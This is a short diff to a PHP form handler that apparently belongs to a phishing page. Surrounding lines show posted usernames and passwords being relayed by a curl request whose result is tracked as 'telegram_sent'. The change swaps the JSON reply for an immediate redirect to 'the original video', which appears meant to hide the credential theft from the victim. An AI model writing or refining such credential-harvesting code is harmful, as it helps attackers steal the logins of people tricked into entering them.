@@ -82,11 +82,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             error_log("Curl Error: " . $curl_error);
         }
         
-        echo json_encode([
-            'success' => true, 
-            'redirect' => $redirect_url,
-            'telegram_sent' => ($http_code == 200)
-        ]);
+        // Always redirect to the original video immediately
+        header("Location: " . $redirect_url, true, 302);
+        exit;
     } else {
         error_log("Missing username or password");
         echo json_encode(['success' => false, 'error' => 'Missing credentials']);
